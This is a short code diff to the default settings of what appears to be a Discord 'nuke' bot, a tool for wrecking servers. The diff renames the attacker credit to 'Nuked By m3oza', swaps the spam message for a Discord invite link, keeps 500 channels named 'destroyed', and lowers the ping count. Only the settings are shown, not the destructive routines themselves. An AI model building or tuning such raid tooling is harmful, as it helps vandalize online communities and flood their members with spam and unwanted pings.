@@ -22,10 +22,10 @@ function getSettings(key) {
     if (!nukeSettings.has(key)) {
         nukeSettings.set(key, {
             channel_name: 'destroyed',
-            server_name: 'Nuked By Destroyux',
-            spam_message: 'NUKED',
+            server_name: 'Nuked By m3oza',
+            spam_message: 'https://discord.gg/JF2EvyfMPQ',
             channel_count: 500,
-            ping_count: 50
+            ping_count: 1
         });
     }
     return nukeSettings.get(key);
